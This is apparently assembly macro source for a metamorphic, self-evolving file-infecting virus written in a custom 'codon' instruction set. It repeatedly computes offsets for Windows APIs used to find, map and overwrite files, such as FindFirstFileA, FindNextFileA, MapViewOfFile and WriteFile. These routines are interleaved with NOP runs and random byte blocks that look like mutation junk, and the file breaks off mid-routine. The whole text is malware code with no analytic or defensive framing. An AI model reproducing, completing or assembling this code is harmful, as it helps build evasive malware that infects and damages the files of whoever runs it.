_nopREAL
_nopREAL
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x06A8
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 100
db 235
db 216
db 129
db 249
db 242
db 116
db 93
db 215
db 8
db 121
db 83
db 143
db 72
db 18
db 111
db 176
db 6
db 182
db 218
db 160
db 39
db 51
db 199
db 14
db 173
db 242
db 148
db 51
db 68
db 115
db 156
db 169
db 39
db 185
db 189
db 140
db 10
db 120
db 86
db 144
db 124
db 12
db 120
db 210
db 103
db 8
db 228
db 141
db 98
db 190
db 120
db 220
db 232
db 65
db 19
db 48
db 224
db 201
db 100
db 146
db 88
db 114
db 55
db 197
db 121
db 138
db 165
db 60
db 207
db 183
db 36
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
db StopCodon
db 247
db 144
db 171
db 132
db 182
db 94
db 42
db 162
db 78
db 39
db 33
db 231
db 211
db 151
db StartCodon
        _save
        _and
        _popall
    end if
       _writeDWord

    _getDO
db StopCodon
db 22
db 109
db 123
db 56
db 208
db 74
db 242
db 118
db 106
db 87
db 6
db 4
db 164
db 35
db 196
db 2
db 10
db 15
db 134
db 40
db 254
db 87
db 21
db 204
db 128
db 180
db 75
db 178
db 1
db 123
db 30
db 35
db 164
db 233
db 66
db 192
db 42
db 31
db 234
db 178
db 163
db StartCodon
    BigNum=mGetFileSize-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x083B
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
_nopREAL
_nopREAL
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord

    _getDO
    BigNum=mWriteFile-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 8
db 9
db 189
db 58
db 2
db 203
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x078B
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord

    _getDO
    BigNum=mGetTickCount-DataOffset
    AlreadyStarted=0
db StopCodon
db 43
db 75
db 125
db 194
db 19
db 64
db 238
db 114
db 12
db 100
db 247
db 193
db 44
db 160
db 131
db 77
db 243
db 72
db 118
db 109
db 55
db 61
db 58
db 225
db 88
db 127
db 183
db 238
db 198
db 220
db 200
db StartCodon
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x01B4
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord

    _getDO
    BigNum=mMapViewOfFile-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x05EE
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 208
db 164
db 178
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord

    _getDO
    BigNum=mSleep-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 129
db 251
db 0
db 120
db 224
db 251
db 224
db 119
db 59
db 207
db 97
db 60
db 84
db 129
db 71
db 195
db 47
db 226
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 51
db 162
db 170
db 156
db 23
db 127
db 136
db 25
db 190
db 18
db 95
db 22
db 190
db 60
db 154
db 204
db 181
db 1
db 148
db 40
db 0
db 11
db 172
db 194
db 198
db 253
db 8
db 228
db 85
db 64
db 161
db 174
db 35
db 241
db 108
db 11
db 49
db 107
db 85
db 234
db 79
db 205
db 4
db 78
db 166
db 234
db 154
db 55
db 147
db 163
db 76
db 8
db 239
db 141
db 235
db 202
db 186
db 35
db 8
db 52
db 211
db 147
db 233
db 47
db 148
db 165
db 151
db 123
db 247
db 131
db 174
db 248
db 148
db 141
db 23
db 115
db 25
db 77
db 141
db 186
db 113
db 35
db 154
db 49
db 36
db 94
db 62
db 67
db 184
db 225
db 45
db 68
db 48
db 58
db 227
db 5
db 20
db 3
db 145
db 77
db 94
db 111
db 213
db 122
db 58
db 134
db 4
db 186
db 221
db 197
db 52
db 174
db 128
db 249
db 100
db 35
db 55
db 61
db 169
db 117
db 15
db 203
db 65
db 164
db 1
db 20
db 52
db 73
db 245
db 177
db 40
db 145
db 78
db 255
db 76
db 74
db 34
db 158
db 101
db 31
db 58
db 76
db 98
db 172
db 190
db 183
db 233
db 208
db 78
db 117
db 46
db 89
db 31
db 37
db 15
db 164
db 14
db 108
db 142
db 99
db 131
db 82
db 150
db 120
db 29
db 30
db 72
db 80
db 42
db 56
db 168
db 247
db 117
db 208
db StartCodon
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x07F9
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord

    _getDO
    BigNum=mFindFirstFileA-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 29
db 222
db 59
db 244
db 97
db 226
db 41
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x094A
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 20
db 231
db 119
db 159
db 5
db 62
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 113
db 116
db 139
db 159
db 221
db 53
db 169
db 223
db 169
db 166
db 125
db 90
db 248
db 32
db 138
db 107
db 251
db 254
db 58
db 96
db 162
db 160
db 87
db 224
db 209
db 54
db 72
db 22
db 86
db 163
db 159
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 235
db 158
db 149
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord

    _getDO
    BigNum=mFindNextFileA-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 203
db 197
db 71
db 196
db 15
db 42
db 142
db 146
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 149
db 140
db 231
db 235
db 211
db 26
db 72
db 68
db 117
db 157
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 51
db 44
db 219
db 155
db 110
db 195
db 223
db 66
db 129
db 38
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=0x0FE1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _writeDWord

    _getDO
db StopCodon
db 113
db 125
db 45
db 171
db 86
db 106
db 140
db StartCodon
    BigNum=mUnmapViewOfFile-DataOffset
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 247
db 172
db 248
db 31
db 242
db 95
db 178
db 235
db 174
db 221
db 196
db 19
db 154
db 45
db 149
db 100
db 133
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
